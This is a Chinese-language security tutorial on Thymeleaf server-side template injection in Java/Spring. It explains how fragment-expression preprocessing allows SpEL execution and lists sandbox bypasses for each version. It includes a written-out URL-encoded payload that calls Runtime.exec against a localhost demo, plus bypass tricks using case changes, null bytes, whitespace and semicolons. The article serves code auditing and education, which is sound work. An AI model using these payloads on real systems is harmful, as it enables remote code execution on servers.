#  JAVA代码审计之Thymeleaf模板注入漏洞  
N2i1
                    N2i1  国家网络空间安全云社区   2026-02-06 09:20  
  
**01**  
  
**Thymeleaf模板引擎介绍**  
  
  
**1.1 什么是Thymeleaf模板引擎**  
  
Thymeleaf 模板引擎 是 一种现代服务器端 Java 模板引擎，适用于 Web 和独立环境。它能处理 HTML、XML、JavaScript、CSS 甚至纯文本。  
  
Thymeleaf 的核心设计理念是 “自然模板”（Natural Templates）：模板文件是纯有效的 HTML（使用自定义属性如 th:text、th:each 等），在浏览器中直接打开时显示为静态原型页面（忽略未知属性），而服务器渲染时动态替换数据。这大大方便前端设计师和后端开发者协作，避免了 JSP 等传统模板的“标签汤”问题。  
  
**主要特点：**  
- 与 Spring 框架深度集成：Spring Boot 默认推荐的视图层技术（spring-boot-starter-thymeleaf），无缝支持 Spring MVC、Spring Security 等。  
  
- 语法优雅：使用 HTML 属性形式（如 th:if、th:each、th:text=“${var}”），不破坏 HTML 结构。  
  
- 多模式支持：HTML、XML、TEXT 等模板模式。  
  
- 高可扩展性：支持自定义方言（dialect）、处理器（processor），可插件化集成第三方功能。  
  
- 原型友好：模板可作为静态 HTML 预览，适合现代前端开发流程。  
  
- 性能优秀：内置缓存机制，支持高并发。  
  
  
  
<table><tbody><tr style="box-sizing: border-box;"><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(213, 238, 247);padding: 6px;box-sizing: border-box;"><section style="text-align: center;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><b style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;">引擎</span></span></b></p></section></td><td data-colwidth="27.0000%" width="27.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(213, 238, 247);padding: 6px;box-sizing: border-box;"><section style="text-align: center;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><b style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;">优点</span></span></b></p></section></td><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(213, 238, 247);padding: 6px;box-sizing: border-box;"><section style="text-align: center;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><b style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;">缺点</span></span></b></p></section></td><td data-colwidth="26.0000%" width="26.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(213, 238, 247);padding: 6px;box-sizing: border-box;"><section style="text-align: center;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><strong style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;">适用场景</span></span></strong></p></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">Thymeleaf</span></span></p></section></td><td data-colwidth="27.0000%" width="27.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">Thymeleaf 自然模板、</span></span></p><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">Spring 集成好、安全性高</span></span></p></section></td><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">学习曲线稍陡、性能略低于</span></span></p><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">FreeMarker</span></span></p></section></td><td data-colwidth="26.0000%" width="26.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">Spring Boot 项目、注重原型协作</span></span></p></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="font-size: 14px;color: rgb(62, 62, 62);text-align: center;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">JSP</span></span></p></section></td><td data-colwidth="27.0000%" width="27.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="font-size: 14px;color: rgb(62, 62, 62);text-align: center;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">Java EE 原生支持</span></span></p></section></td><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="font-size: 14px;color: rgb(62, 62, 62);text-align: center;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">标签混乱、不利于静态预览</span></span></p></section></td><td data-colwidth="26.0000%" width="26.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">遗留项目</span></span></p></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">FreeMarker</span></span></p></section></td><td data-colwidth="27.0000%" width="27.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">性能高、表达式强大</span></span></p></section></td><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">模板易引入逻辑代码、安全风险较高</span></span></p></section></td><td data-colwidth="26.0000%" width="26.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(231, 231, 231);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">高性能需求、非 Spring 项目</span></span></p></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="font-size: 14px;color: rgb(62, 62, 62);text-align: center;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">Velocity</span></span></p></section></td><td data-colwidth="27.0000%" width="27.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="font-size: 14px;color: rgb(62, 62, 62);text-align: center;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">语法简单   </span></span></p></section></td><td data-colwidth="23.0000%" width="23.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="font-size: 14px;color: rgb(62, 62, 62);text-align: center;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">已停止维护</span></span></p></section></td><td data-colwidth="26.0000%" width="26.0000%" style="border-width: 1px;border-color: rgb(255, 255, 255);border-style: solid;background-color: rgb(245, 245, 245);padding: 6px;box-sizing: border-box;"><section style="text-align: center;font-size: 14px;letter-spacing: 0px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 12px;letter-spacing: normal;">老项目</span></span></p></section></td></tr></tbody></table>  
  
Thymeleaf 自 2012 年发布以来（当前最新版为 3.1.x），已成为 Spring 生态中最受欢迎的模板引擎之一，官网：https://www.thymeleaf.org/  
  
**1.2 基础语法学习**  
  
1.变量表达式（Variable Expressions）：${…}  
- 用于访问上下文（Context）中的变量，通常是 Controller 传入的 Model 属性。  
  
- 支持 OGNL（或 Spring EL）语法，可访问对象属性、方法、集合等。  
  
- 示例：  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRDtzEGXfibia1Mxhul6OKONCxnxV4tiamIcWHfeWxGePA0rsudwx5k0cYVvUjm9vweuCpXxr2zyXQKwFZTRBbeVfXoIOgye5pxbS4/640?wx_fmt=png&from=appmsg "")  
  
2.选择表达式（Selection Expressions）：*{…}  
- 与变量表达式类似，但作用于通过 th:object 选定的对象，而不是整个上下文。  
  
- 常用于表单绑定，简化嵌套属性访问。  
  
- 示例：  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRBHViaHwxYoMAj44ewZTE0DneXIHiaFKp3RoyzlVkwKhPSjNo1mpjhorltWSOct9SibhttlcMKnViabEEO2sF1ox1nJYic5xG80XUTA/640?wx_fmt=png&from=appmsg "")  
  
3.消息表达式（Message / i18n Expressions）：#{…}  
- 用于国际化（i18n），从 .properties 文件中读取消息，支持参数占位符。  
  
- 与 Spring 的 MessageSource 集成。  
  
- 示例：  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRC6ZxUNGTZiaCjraD3wIV6pleP9Y6td3WxiaLWarbZoVhAv1xl0M8lb13YvZXf4HyL3PAOTZI4y4licgTE5otXiaEdroJItQcDuJXU/640?wx_fmt=png&from=appmsg "")  
  
4.链接表达式（Link / URL Expressions）：@{…}  
- 用于构建 URL，支持相对路径、绝对路径、参数等。  
  
- 自动处理上下文路径（context path）和 URL 重写。  
  
- 示例：  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBA5TIvRxqzx4ibib4PG5ic1xW2Dot54sJcOR4ofsnxnG44USXtTqeCxafL5NllfXPHFy0XkYAQLFq7C2Rzv8CbicYIUvwZ7nMXicTM/640?wx_fmt=png&from=appmsg "")  
  
5.片段表达式（Fragment Expressions）：~{…}  
- 用于引用模板片段（fragments），实现布局复用（如 header、footer）。  
  
- 常与 th:insert、th:replace 或 th:include（旧版）结合。  
  
- 示例：  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRDeP0hqqJOWDOxBg3s5t5qPd3pVcqjHtN3f5tWOXr9PUTvViaiaoh0sib4Up91Ibdt9dIak0BMw3PHwPqgp3ZdX7X46HPgcKoOPAQ/640?wx_fmt=png&from=appmsg "")  
  
**1.3 Thymeleaf 表达式预处理**  
  
通 ${…} 变量表达式处于 Thymeleaf 的受限执行环境，只能访问上下文已暴露的对象，并被严格禁止危险操作（如 T(java.lang.Runtime)），而 SSTI PoC 所需的任意 SpEL 执行只有在表达式预处理阶段（${…}）的宽松环境中才能实现，因此直接写在 ${…} 中无法执行恶意代码。  
  
Thymeleaf 在片段表达式（FragmentExpression）的 selector 解析阶段会先对 ${…} 进行预处理，使用一个限制更少的 SpEL 执行上下文（早期版本几乎无黑名单、允许 T() 类型引用和新对象构造），而普通表达式阶段强制启用 restricted mode 并严格禁止这些危险操作，导致恶意 SpEL 只有在预处理阶段才能被完整执行。  
  
以下是表达式预处理的详细解释：  
  
Thymeleaf 支持一种特殊的表达式预处理机制，它允许在标准表达式执行前，先对内层表达式进行求值，从而动态生成或修改最终的表达式内容。这是一个强大但相对高级的功能，常用于复杂国际化、动态逻辑等场景。  
  
在任何标准表达式内部，使用双下划线包围内层表达式：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRB3t49vfmARdxcxTFS1KW7uZ1KUDb40bdlQfX22cLiaBvAmXibvNMlf555cib9ticlpBxRQVsGxZ8tkmJdeEzcLAQ0Aibc80gSkBewE/640?wx_fmt=png&from=appmsg "")  
  
当攻击者能够控制返回的视图名（view name）或片段名（fragment name）时，Thymeleaf 会把这个字符串解释为片段表达式（Fragment Expression） ~{…}，而片段表达式的解析过程会触发表达式预处理（Preprocessing）。也就是说只有通过预处理机制，攻击者才能注入并执行任意 SpEL 表达式，而普通表达式位置无法做到这一点。  
  
**02**  
  
**演示案例学习**  
  
  
**2.1 如何构造PoC**  
  
核心在于片段表达式（Fragment Expression）的构造规则，即视图名（view name）中包含 :: 时，会被解析为 ~{templateName :: fragmentSelector} 形式，并在 fragment selector（:: 后的部分）上触发表达式预处理（preprocessing），从而执行恶意 SpEL。  
  
Spring 集成触发解析（thymeleaf-springX 包，类 org.thymeleaf.springX.view.ThymeleafView）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRDY1Ob1jGxSGUtSvZDmtIQJWFdopOnZDziaDL05meXQvBHGUtYf7icibYRJnO5rkDZYcckwOgc1ibsrU5iaqkTNnibYzlBiaFMwAM0txg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRBM2rwdiadLa0hWR4TjYyfJbc4yiaerUgWrN1Gs7kbPpDkX0Pd1FMicKA4S94ccpTvLsKHRM1HIicb2r2k6LBibJL4g7ucmwfQkCPoo/640?wx_fmt=png&from=appmsg "")  
  
我们可以知道，最底层的触发PoC代码是SPEL表达式注入漏洞，因而需要构造一个SPEL表达式注入的PoC，再添加“::”以及预处理标签符号“__”。还有一个问题就是“::”应该放在哪里呢？这里可以放在前面也可以放在后面，主要是为了进入else的语句。官方的PoC如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBZibGpHweREXt7jb6LBp04MwxXticuHYuWaK08Clia9GF0vhiaWVlCA96d5hIvNqolzlibFa9AppWbeR7WNzYZCG7Uric1OKCTGx7Ys/640?wx_fmt=png&from=appmsg "")  
  
原因如下：  
  
Thymeleaf 在解析 selector 时，对以 . 结尾的字符串容忍度最高（. 在 Markup Selector 中是合法的 class 选择器前缀，即使后面没内容也不会报错）， 相比之下：  
- ${SPEL}:: → 很多版本认为 selector 为空 → 抛异常  
  
- ::${SPEL} → 部分版本认为非法开头 → 解析失败  
  
  
  
**2.2 演示案例**  
  
构造相关演示案例如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRB5nxYkPjNjdQD2Exz5TH8wW5KXjHKAkzDU4TyLAibcKDunCw0MGsXvVheibNF6WwQYBOfibB8dDzuAGQkZzZB4woFeYDeQMcDo4M/640?wx_fmt=png&from=appmsg "")  
  
记得对PoC进行url编码，因为payload在不编码的情况下进行HTTP 请求传输过程中就会被破坏，导致无法完整到达服务器，从而无法触发漏洞。  
  
访问url：http://127.0.0.1:8090/fragment?section=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d%3A%3A，成功执行POC。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAId2YRKicXBMMUbYobrlJ7j0u0NvGRx7icibHicUQp46ibnW7cERC3FRhvUsgUXG5FFW81N91NtPzHSJgJPkQlJu8tNibQwvIXcicsrQ/640?wx_fmt=png&from=appmsg "")  
  
**03**  
  
**各版本bypass**  
  
  
Thymeleaf SSTI 在各个版本都有绕过方法，是因为其预处理阶段的 SpEL 沙箱本质上是“补丁式”黑名单防御，而 Java 反射机制和 SpEL 表达式过于强大，总能通过空格插入、字面量替换、新型 gadget 链或反射调用等手段绕过黑名单，导致每次修复后不久又出现新绕过。  
  
- 早期版本：几乎无严格沙箱，直接用 T(java.lang.Runtime) 等即可 RCE，无需复杂绕过。  
  
- 3.0.13.RELEASE：加强 restricted mode，禁止常见 T(、Runtime 等；绕过常用空格/制表符插入（如 T (java.lang.Runtime)）或字面量替换 |T(java.lang.Runtime)| 隐藏检测。  
  
- 3.1.1.RELEASE：进一步黑名单（如禁止 org.springframework.util 静态访问）；绕过包括利用其他 gadget 类、反射调用私有方法，或 crafted HTML（如 Spring Boot Admin MailNotifier 场景下注入）。  
  
- 3.1.2+：更严反射限制、黑名单扩展；绕过转向高级反射（如动态访问私有字段/方法）、新型 gadget 链，或结合应用特定上下文（如自定义 Bean）。例如 modzero 2024+ 报告在 Spring Boot 3.3.4 中仍通过反射找到 novel bypass 达成 RCE。  
  
这里现在只给出PoC以及简单分析，详细代码分析可以查看参考来源的分析(珂字辈、PANDA等师傅的文章)  
  
**3.1 Thymeleaf 小于3.0.11**  
  
几乎无 restricted mode 严格限制，预处理阶段 SpEL 执行宽松。直接执行相关PoC即可，最后调用SPEL解析器org.springframework.expression.ExpressionParser.parseExpression() 和Expression.getValue()执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRB29gnNpJ27a8J58yCSC3FYkQDQSGj8rHczQDyGH1yVtCuloquBMF7hibz8GsWvxlC35pRESTXHGCmyTkvYr9z8YrRBxcLxcv4o/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBQaLdGh1qAE4wwc5LYz4icRicteYRJ7Kb4R0jDriclPt0aoAE7PYUO4fbGOUAbdKVT7ZQkVFR94wT7FYWHfgZM5satJsaXAGcnFg/640?wx_fmt=png&from=appmsg "")  
  
**3.2 Thymeleaf 3.0.12**  
  
在3.0.12版本中新增加了一个检测：org.thymeleaf.spring5.util.SpringStandardExpressionUtils.containsSpELInstantiationOrStatic()  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRCT6kZarEqLibkSzKLyeWmqPtzt5MVz8FxE6icgg4oKzIwIWEU7icgY7phLLsxJzrL6ISG1XnNPSDTkyq3Ff16ibq3p1rQpqPYkYYs/640?wx_fmt=png&from=appmsg "")  
  
详细介绍如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRCLQW5IqlLIte0Jn39l6pIopUrlUd8ppA5KcT32ucJDqGeOicfZR6cyvUia6fMsS1sCqP5sz8z5eTnaXiaYPa5G88J4d2cgfB7A98/640?wx_fmt=png&from=appmsg "")  
  
这个方法通过从右向左倒序扫描 SpEL 表达式字符串，严格检测独立的“new”（对象实例化）和 “T(”（“T”不能和“(”在一起）关键字，若存在则返回 true 以在受限模式下禁止执行，防止 SSTI 导致的任意代码执行。这里没有进行严格的大小写限制，且SPEL不区分大小写，我们可以用“New”进行绕过。  
- 大小写绕过 new 关键字  
  
- 空白字符绕过“T(”检测(T%20(、T%09(、T%0A(、T%0D)  
  
- 加号或其他运算符变形（T+(、T-(）  
  
- 空字节 %00 截断检测  
  
  
  
  
除此之外，3.0.12版本在org.thymeleaf.spring5.view.ThymeleafView.java中引入了新的一行检测代码 ，此方法检查视图名中是否包含了直接来自用户 HTTP 请求输入的内容，如果包含则抛出异常，阻止渲染(值得一提的是这个方法只对传入参数为路径时生效)。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRABYpkYIa2rJotfWwGU9G46ibeAOKLAicoqfliba9gJMIHZRGoIh4OYVSTVictOlQGXLHDabVtC0XOFdVgSVxC5wFvvic6AicOrMLIRs/640?wx_fmt=png&from=appmsg "")  
  
进入看看如何进行校验的，vn值是对我们输入的PoC进行规范化（去除多余空白、统一格式）后赋值的。requestURI值是解码后的url请求路径。如果请求路径包括我们输入的PoC→ 抛出异常，中止渲染。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAScG45HxaibtaJId0QG2KUicwmgTL7X6CiafoHZvAAqRQbq8YicNO5j6UGv7eEdicOz2NjlAz7BTAE5KSZHGxXbUJOsLB2xCe6xFjs/640?wx_fmt=png&from=appmsg "")  
  
绕过方法就是通过差异化解析，让vn的值与requestURI的值形成差异。我们可以利用SpringBoot的解析差异进行绕过。SpringBoot 有一个功能叫做矩阵变量，默认是禁用状态。org.springframework.spring-web.5.3.25.spring-web-  
5.3.25.jar!.org.springframework.web.util.UrlPathHelper.class  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRArdCaCpbapjRpBDYmJjPcNRPPKgcibPibia5F352VgWJGGBTjVre9Q9f7QFFXfqTQKqQPBkQYZaficiakibmX8DdJnTGrHjFjZAQHFk/640?wx_fmt=png&from=appmsg "")  
  
removeSemicolonContent = true（默认），矩阵变量功能被禁用，@PathVariable 只取分号前的内容，request.getRequestURI() 仍保留完整路径。也就是说我们可以通过分号绕过路径限制。  
  
**1. 通过传入参数进行渲染**  
  
以下案例为通过返回参数进行渲染：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAfMrQfVMPPNianmSkygD8EdpTmWAPWT6CPTsPOE55Cf1WdGibBEppgcFroCctDgoaRPQg13S0wtpAzRuN7VobdtUxOOAeCZraBc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRDUzXOqnLicZIGcnJDMamycEicKQIEaw0DLktIibmdqBcCNBFp2bqKVjRNgwHbTdKUKmBG0Tloic2nkZ0wb56Lwoxt0VibrmicOV5Vgk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRCiaSYKBMHOUOUUNLb2CRia7IiagMggwrSSVNk1tk2Q4Q9Ov6cP4f5MBCdVxgzWDCvpL3N9HdOPHNCu8Kt2NibbkSs92bkR2pdicKM8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAaXZAPHjSgdFA7mvLYibUY9MQrVI9Bc7WmPD6TSpNzejxSgOQVGticx8X8Ihg9ViauiavKXjkuX2MNAocyRnibxH3ht8pJtSOr7H9Q/640?wx_fmt=png&from=appmsg "")  
  
通过%00绕过与大写New有些许不同，Java 中，字符串以%00作为内部终止符。 当表达式字符串中出现%00时，检测器只看到 ${%00 之前的部分，不会检测到“new”，因而绕过了检测。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBK0iaDQLazwiaHib6s7ocR3EDgvMkpWdO2yXbfhlMCzgya9nqykTfiaYjnM3OvA9iasGPZOCDvbEteYZJuXMzzuzqMtNtK09ic1mA9M/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAICcxibKico53QnrGke4InKVPz1I7UFvfnqcwLHJTpKjh97th2stVvmUNtpqwu8YS2BibBE2hJth02uavWQ1TlC66Lz2hoY8mic2k/640?wx_fmt=png&from=appmsg "")  
  
这招只能在传入值为参数时生效，传入值为路径就无法生效了。  
  
**2. 通过传入路径进行渲染**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAacKUmumuhjWoqicy1w0xEdNjm55b0oWAQTBWM9AL3HtfHTaBEjdhh37ohxCZfYbYoBUzeVkyDNjACKNFmfb5un7D3vA1mJZts/640?wx_fmt=png&from=appmsg "")  
  
可以看到vn值与requestURI值不同，因而绕过了checkViewNameNotInRequest方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAPa7Zj75NXt4MXmGnKWLTnV4yevXC02ZfkoufENghEfHJqxbnZNreXqjCwKgvR2ppDvPw9Q8Y2uKfQSX3oK9KLNyydQcrN1r0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAJ55qyXn3a1r5y2ShbAwlnughMB8ORk4SM2sTDVicw4eI1GL4eacMCHmcHzlCg6y1pq9b9FWzibZkx8IBS7ag4JL8VgloIWP7lU/640?wx_fmt=png&from=appmsg "")  
  
**3.3 Thymeleaf 3.0.13**  
  
在Thymeleaf3.0.13版本中，没有太大变化，对校验逻辑进行增强，原始“T%20(”进行强校验，中间添加空格已经无法继续绕过了。基本思路转向为间接反射，  
  
org.thymeleaf.spring5.util.SpringStandardExpressionUtils#containsSpELInstantiationOrStatic中对new关键字的检测没有变化，通过New仍可以进行绕过。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAZg4lQulnXdUs6Gw1EicSlWzsy7yIcpKVWHtQpm50W8CbNuDe2OdQibxgpJNXicTicdZx79UtXHpjglQVjOCostUa1zxqUwqeQ44w/640?wx_fmt=png&from=appmsg "")  
  
不同点在于对“T”关键字的检测更 加严格了，新增了一个isPreviousStaticMarker方法，改方法可向前跳过所有空白字符，无论 “T”和 “(”之间有多少空白字符，都能正确识别为 “T(”，但是这里还是没有校验“%00”，仍然可以使用“%00”绕过。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRDqAdWzamHv2yrKlgxenL110d94C8fnRZJdibpRfZpRbojB31xTkZr6Ug7B4Lf5hx0IMsqughchCoDtMpicp1b8uSfG1xbcpLOuA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRAkFadeKqBaYTyCxMia0goWFjYEffegme5bicxpzZHn5mnm0Jku96knVH9YAPZWDRpn9eH98qV8D7s3aBkkbicoBwR8FCl1XewHXw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRBs7icgY3XWVU0s9ibHwiavwG5yMCicU997N1mJjgqbXMVAduxV2H2bibmW2I0W75RsKPN9CfXHdhYklQdqlg6N7qS5bFazapt7glxk/640?wx_fmt=png&from=appmsg "")  
  
  
  
**3.4 Thymeleaf 3.0.14**  
  
对比3.0.13版本，我们可以看到：https://github.com/thymeleaf/thymeleaf/compare/thymeleaf-spring5-3.0.13.RELEASE…thymeleaf-spring5-3.0.14.RELEASE  
  
org.thymeleaf.spring5.util.SpringStandardExpressionUtils[#isPreviousStaticMarker新增了以下方法]()  
：此方法是检测是否出现了“param”关键字。禁止模板中使用 ${#param.xxx} 或 ${param.xxx} 来直接访问 HTTP 请求参数。当然了，此检测还是可以通过大小写进行绕过，且对new的检测逻辑不变，也可以用此方法绕过。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dBEVa0kEoRCNd7JexE4hEuLo1MibdsQicbGoicibicwcVdh3tRvGFpXZPSWYfRlJ8Qic1n6kumSxmj7zARlr66cia3icp00iaIBu3q713CMApWNU8cCI/640?wx_fmt=png&from=appmsg "")  
  
发现还新增了一个org.thymeleaf.spring5.util.SpringRequestUtils.containsExpression()方法，该方法用于判断一个字符串是否包含Thymeleaf 标准表达式（如 ${…}、*{…}、#{…}、@{…}、~{…}）,这里校验存在缺陷，使用“$${…}”即可绕过，但是“$${…}”并不是thymeleaf的标准语法，因此我们需要想办法将其划分变成${}格式的。恰好thymeleaf就有这个功能——字面量替换。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dBEVa0kEoRAy0EE6G72F1FPZQHlLvjBYRFJLiaZiaicUTmribOzKeOAKpjGTiccOia2mwodeJSU1Fn6ZrIMJcEUGEsfAaKVaibCRGftrwTXlicmic77A/640?wx_fmt=png&from=appmsg "")  
  
查看官方文档获取详情：https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html?referrer=baidu.com#literal-substitutions  
  
